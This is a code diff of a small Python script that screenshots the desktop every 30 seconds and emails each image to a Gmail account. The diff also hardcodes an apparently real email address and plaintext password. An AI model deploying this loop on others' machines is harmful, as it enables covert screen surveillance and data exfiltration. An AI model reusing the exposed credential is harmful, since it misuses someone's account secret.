@@ -9,15 +9,15 @@
 
 
 
-import sys, smtplib, pyautogui, time
+import smtplib, pyautogui, time
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
 
 #Define data
-send_to = 'SEND_TO@EMAIL.COM'       #email to send
-user_email = 'USER_EMAIL@EMAIL.COM' #your email
-user_password = 'PASSWORD'          #your password
+send_to = 'forpysendemail@gmail.com'       #email to send
+user_email = 'forpysendemail@gmail.com' #your email
+user_password = '2324zzp001'          #your password
 smtpserver = 'smtp.gmail.com'       #smtp server, gmail is recomended
 smtpport = 587                      #smtp server's port
 delay = 30                          #delay between sending emails in seconds
@@ -44,15 +44,11 @@ class SCSender:
         self.msgRoot.attach(self.msgImage)
     #send email
     def send_email(self):
-        try:
-            server = smtplib.SMTP(smtpserver, smtpport)
-            server.starttls()
-            server.login(user_email, user_password)
-            server.sendmail(user_email, send_to, self.msgRoot.as_string())
-            server.quit()
-        except:
-            sys.exit()
-            print('Somefing went wrong.')
+        server = smtplib.SMTP(smtpserver, smtpport)
+        server.starttls()
+        server.login(user_email, user_password)
+        server.sendmail(user_email, send_to, self.msgRoot.as_string())
+        server.quit()
 
 
 
@@ -62,9 +58,11 @@ main = SCSender()
 while True:
     main.make_screenshot()
     main.make_email()
-    main.send_email()
-    time.sleep(delay)
-
+    try:
+        main.send_email()
+        time.sleep(delay)
+    except:
+        print('Program has finished the work.')
 
 
 
